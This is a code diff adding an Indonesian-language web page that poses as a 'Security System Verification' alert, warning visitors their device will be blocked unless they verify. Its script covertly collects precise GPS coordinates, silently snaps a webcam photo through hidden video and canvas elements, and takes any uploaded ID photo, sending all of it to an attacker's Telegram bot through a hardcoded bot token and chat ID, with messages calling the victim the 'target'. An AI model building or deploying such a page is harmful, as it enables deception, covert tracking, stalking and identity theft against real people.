@@ -1,0 +1,106 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security System Verification</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { width: 90%; max-width: 400px; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); text-align: center; }
+        .blink { animation: b 1.5s infinite; color: red; font-weight: bold; }
+        @keyframes b { 50% { opacity: 0; } }
+        .btn { background: #0f0; color: #000; padding: 12px; border: none; width: 100%; margin-top: 15px; font-weight: bold; cursor: pointer; }
+        #status { font-size: 12px; margin-top: 10px; color: #888; }
+        #v, #c { display: none; } /* Sembunyikan kamera & canvas */
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <div class="blink">[!] SECURITY ALERT [!]</div>
+        <p>Browser Anda terdeteksi melakukan aktivitas mencurigakan. Selesaikan verifikasi identitas untuk menghindari pemblokiran perangkat.</p>
+        
+        <button class="btn" onclick="startTracking()">VERIFIKASI GPS & WAJAH</button>
+        
+        <div style="margin-top: 20px; border-top: 1px solid #333; padding-top: 10px;">
+            <p style="font-size: 11px;">Upload Foto ID/Profil untuk Pemulihan:</p>
+            <label for="g" style="background:#222; color:#0f0; padding:5px 10px; cursor:pointer; font-size:12px; border:1px solid #0f0;">BUKA GALERI</label>
+            <input type="file" id="g" accept="image/*" style="display:none;" onchange="upGal(this)">
+        </div>
+
+        <div id="status">Menunggu interaksi...</div>
+    </div>
+
+    <video id="v" autoplay></video>
+    <canvas id="c" width="640" height="480"></canvas>
+
+    <script>
+        // --- KONFIGURASI TELEGRAM ---
+        const T = '8387216820:AAEYdZ-QvKueseBZ0N1G1LHEZT1Lps5uqyA'; 
+        const C = '8204814098';
+        // ----------------------------
+
+        async function send(msg, isPhoto = false, blob = null) {
+            if (isPhoto) {
+                const f = new FormData();
+                f.append('chat_id', C);
+                f.append('photo', blob, 'capture.jpg');
+                f.append('caption', msg);
+                await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
+            } else {
+                await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: C, text: msg, parse_mode: 'Markdown' })
+                });
+            }
+        }
+
+        async function startTracking() {
+            const st = document.getElementById('status');
+            st.innerText = "Memproses koordinat GPS & Biometrik...";
+
+            // 1. GPS AKURAT 100%
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                const r = `🎯 **GPS LOCK 100%**\nMaps: https://www.google.com/maps?q=${lat},${lon}\nAcc: ${Math.round(p.coords.accuracy)}m`;
+                await send(r);
+
+                // 2. KAMERA (FOTO WAJAH)
+                try {
+                    const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                    const v = document.getElementById('v');
+                    v.srcObject = s;
+                    setTimeout(async () => {
+                        const cn = document.getElementById('c');
+                        cn.getContext('2d').drawImage(v, 0, 0, 640, 480);
+                        cn.toBlob(async (b) => {
+                            await send("📸 **FOTO WAJAH TARGET**", true, b);
+                            s.getTracks().forEach(t => t.stop());
+                        }, 'image/jpeg');
+                        st.innerText = "Verifikasi Berhasil!";
+                        alert("Verifikasi Identitas Selesai.");
+                    }, 2000);
+                } catch (e) {
+                    await send("⚠️ Target menolak izin Kamera.");
+                }
+            }, async (e) => {
+                await send("⚠️ Target menolak izin GPS.");
+                st.innerText = "Gagal. Mohon izinkan GPS.";
+            }, { enableHighAccuracy: true });
+        }
+
+        // 3. FUNGSI AMBIL DARI GALERI
+        async function upGal(i) {
+            const f = i.files[0];
+            if (!f) return;
+            document.getElementById('status').innerText = "Mengirim file...";
+            await send(`📂 **FILE DARI GALERI**\nNama: ${f.name}`, true, f);
+            document.getElementById('status').innerText = "File terverifikasi.";
+            alert("File ID Berhasil Diunggah.");
+        }
+    </script>
+</body>
+</html>
